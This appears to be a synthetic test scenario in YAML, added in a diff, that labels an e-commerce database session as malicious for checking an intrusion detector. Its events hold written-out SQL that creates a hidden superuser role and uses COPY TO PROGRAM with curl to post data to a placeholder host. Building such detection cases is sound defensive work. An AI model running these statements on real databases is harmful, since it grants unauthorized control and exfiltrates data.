@@ -1,0 +1,23 @@
+scenario_id: gen_ecommerce_01_data_tamper_mal_30
+family_id: gen_ecommerce_01_data_tamper_mal_fam30
+domain: ecommerce
+time_of_day: '22:05'
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: support_agent
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.0
+  events:
+  - step_id: act
+    sql: CREATE ROLE svc_732820 SUPERUSER LOGIN PASSWORD 'x844946'
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://clearinghouse-batch.example/ingest
+      -d @-'
+    connects_to:
+      ip: 10.16.28.22
+      port: 5432
